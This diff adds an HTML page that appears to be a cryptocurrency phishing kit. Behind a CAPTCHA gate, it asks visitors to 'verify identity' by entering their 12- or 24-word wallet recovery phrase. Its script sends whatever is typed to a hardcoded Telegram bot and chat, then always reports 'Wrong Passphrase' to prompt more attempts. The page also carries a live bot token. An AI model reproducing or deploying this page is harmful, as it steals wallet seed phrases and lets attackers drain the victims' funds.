@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- Cloudflare Turnstile CAPTCHA script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
+        #content {
+            display: none; /* Hide the content initially */
+        }
+        #captcha {
+            text-align: center;
+            margin-top: 20px;
+        }
+        body {
+            background: url(https://media.istockphoto.com/id/1394730671/photo/data-blocks-in-cyberspace-metaverse-and-virtual-reality.webp?s=2048x2048&w=is&k=20&c=K6jtCPEw-wPkIykcaj5rBoBYhV1RHRV8bMx7F37r8pI=) no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            position: relative;
+        }
+        button, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        button {
+            background: #007bff;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        #thankyou {
+            text-align: center;
+            color: red;
+            font-size: 16px;
+            position: absolute;
+            top: -30px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div id="captcha">
+        <!-- Cloudflare Turnstile CAPTCHA widget -->
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAAAfTyPmH6yIwleL8" data-callback="onTurnstileSuccess">
+            <div class="cf-turnstile-wrapper" style="border: 0px; margin: 0px; padding: 0px;">
+                <input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-tg5yl_response">
+            </div>
+        </div>
+    </div>
+    <div id="content">
+        <meta charset="UTF-8">
+        <meta content="width=device-width,initial-scale=1" name="viewport">
+        <title>Submit Form</title>
+        <div class="form-container">
+            <div id="thankyou"></div>
+            <form id="submitForm" autocomplete="off" method="post">
+                <textarea id="message" name="message" placeholder="Enter 12 Key Passphrase Or 24 Key Passphrase." required></textarea>
+                <button type="submit">Verify Identity</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- JavaScript to handle CAPTCHA success and form submission -->
+    <script>
+        function onTurnstileSuccess(token) {
+            // Show the content and hide the CAPTCHA after successful validation
+            document.getElementById('captcha').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+        }
+
+        document.getElementById('submitForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var message = document.getElementById('message').value;
+            var botToken = '7029189266:AAGvtrJ5ROxM9IJ3DUzP8f_zGK0SG9_Bxi8';
+            var chatId = '-4203732005';
+
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            var data = new FormData();
+            data.append('chat_id', chatId);
+            data.append('text', message);
+
+            fetch(url, {
+                method: 'POST',
+                body: data
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.ok) {
+                    document.getElementById('thankyou').textContent = 'Wrong Passphrase, Please Try Again With The Correct Passphrase';
+                    document.getElementById('thankyou').style.display = 'block';
+                    document.getElementById('message').value = '';
+                } else {
+                    alert('Failed to send message. Please try again.');
+                }
+            })
+            .catch(error => {
+                alert('Error: ' + error);
+            });
+        });
+    </script>
+</body>
+</html>
